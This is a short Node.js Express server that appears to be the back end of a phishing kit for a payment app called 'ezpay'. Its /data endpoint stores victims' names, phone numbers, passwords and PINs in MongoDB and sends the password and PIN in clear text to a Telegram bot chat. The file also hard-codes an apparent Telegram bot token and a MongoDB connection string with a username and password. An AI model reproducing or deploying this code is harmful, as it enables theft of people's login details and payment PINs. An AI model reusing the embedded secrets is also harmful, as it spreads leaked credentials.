const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const fetch = require("node-fetch")

const app = express()

app.use(cors())
app.use(express.json())

// Telegram details
const BOT_TOKEN = "8432120836:AAGY6HSYRnT1EtU0SyEA_8G0IaeqXn3gido"
const CHAT_ID = "8576159487"

// MongoDB connect
mongoose.connect("mongodb+srv://Yourgaurav07:dtGsryvfx3cpBOad@ezpay.le2xuq1.mongodb.net/ezpay?retryWrites=true&w=majority")

.then(()=>console.log("MongoDB Connected"))
.catch(err=>console.log(err))

// Schema
const UserSchema = new mongoose.Schema({
name:String,
device:String,
ID:String,
password:String,
confirmationpin:String,
pin:String,
phone:String,
time:String
})

const User = mongoose.model("User",UserSchema)

// Telegram function
function sendTelegram(message){
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
})
}

// API
app.post("/data", async (req,res)=>{

const user = new User(req.body)
await user.save()

const message =
`New Data Received

Name: ${req.body.name}
Phone: ${req.body.phone}
Password: ${req.body.password}
PIN: ${req.body.pin}
Time: ${req.body.time}`

sendTelegram(message)

res.send("Data Saved")

})

// server start
const PORT = process.env.PORT || 6000

app.listen(PORT, ()=>{
console.log("Server running")
})